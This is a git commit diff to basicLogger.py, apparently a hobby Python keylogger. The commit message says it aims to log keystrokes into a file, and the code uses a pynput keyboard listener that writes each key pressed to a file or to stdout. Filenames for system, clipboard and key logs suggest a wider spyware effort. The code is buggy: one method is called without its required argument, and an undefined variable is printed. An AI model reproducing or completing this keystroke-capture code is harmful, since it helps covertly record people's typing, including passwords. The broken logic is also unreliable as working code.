5162be94d5a31585c4dc4194aeee5408ec44060a
gavinlampton <60271526+gavinlampton@users.noreply.github.com>
2022-11-13 21:38:08 -0800

    Working towards a keylogger that logs keys into a file. Still not sure why it doesn't write to the file.

--- basicLogger.py
+++ basicLogger.py
@@ -11,22 +11,49 @@ system_information_e = 'e_system.txt'
 clipboard_information_e = 'e_clipboard.txt'
 keys_information_e = 'e_keys_logged.txt'
 
-class MyListener:
-    def __init__(self, outputLocation):
-        self.outLocation = None
-        try:
-            self.outLocation.open(outputLocation, "wt")
-        except:
-            self.outLocation = sys.stdout
+writeOnLetterCount = 16
 
+class MyListener:
+    def __init__(self, writeFilename):
+        self.letter_count = 0
+        self.outLocation = None
+        self.isWritingToFile = None
+        self.writeFilename = writeFilename
+
+        self.write_to_location(writeFilename)
     def on_press(self, key):
-        self.outLocation.write('key {0} pressed'.format(key))
+        self.outLocation.write('{0}'.format(key))
+        self.letter_count += 1
+
+        print(self.letter_count)
+
+        if self.letter_count >= writeOnLetterCount:
+            if self.isWritingToFile:
+                print("Writing file")
+                self.outLocation.close()
+                self.write_to_location()
+                self.letter_count = 0
+                return False
+
+    def write_to_location(self, is_write):
+        if not self.writeFilename == "":
+            try:
+                if is_write:
+                    self.outLocation = open(self.writeFilename, "wt")
+                else:
+                    self.outLocation = open(self.writeFilename, "at")
+
+                self.isWritingToFile = True
+            except FileNotFoundError:
+                self.outLocation = sys.stdout
+                self.isWritingToFile = False
 
     def close(self):
         try:
             self.outLocation.close()
-        except Exception as e:
+        except FileNotFoundError:
             print(e)
+
 
 test = MyListener(keys_info)
 
@@ -35,7 +62,7 @@ inp = input('Please type:\n')
 with keyboard.Listener(on_press=test.on_press, on_release=None) as listener:
     try:
         listener.join()
-    except Exception as e:
+    except FileNotFoundError as e:
         print('{0} exception happened...'.format(e.args[0]))
     finally:
         test.close()
